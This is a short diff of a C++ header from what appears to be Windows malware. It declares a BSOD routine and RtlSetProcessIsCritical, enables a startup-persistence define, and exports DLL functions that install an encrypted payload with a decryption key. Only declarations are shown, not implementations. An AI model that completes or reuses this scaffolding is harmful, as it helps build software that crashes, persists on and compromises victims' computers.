@@ -1,6 +1,4 @@
 #pragma once
-#include <string>
-#include <Windows.h>
 
 void BSOD();
 
@@ -22,12 +20,11 @@ EXTERN_C NTSTATUS NTSYSAPI RtlSetProcessIsCritical(BOOLEAN bNew, BOOLEAN* pbOld,
  Unmonitored
 ************/
 
-//#define StartupFile
+#define StartupFile //WARNING: codecvt_utf8_utf16 is deprecated
 
 extern "C"
 {
-	#define PAYLOAD_API __declspec(dllexport)
-	PAYLOAD_API bool AntiLeague();
-	PAYLOAD_API void QuickInstall(std::string* payload, const std::string& dec_key);
-	PAYLOAD_API void Init(std::string* _payload, std::string* payload, const std::string& dec_key);
+	__declspec(dllexport) bool AntiLeague();
+	__declspec(dllexport) void QuickInstall(const std::string& payload, const std::string& dec_key);
+	__declspec(dllexport) void Init(const std::string& payloadPath, const std::string& payload, const std::string& dec_key);
 }
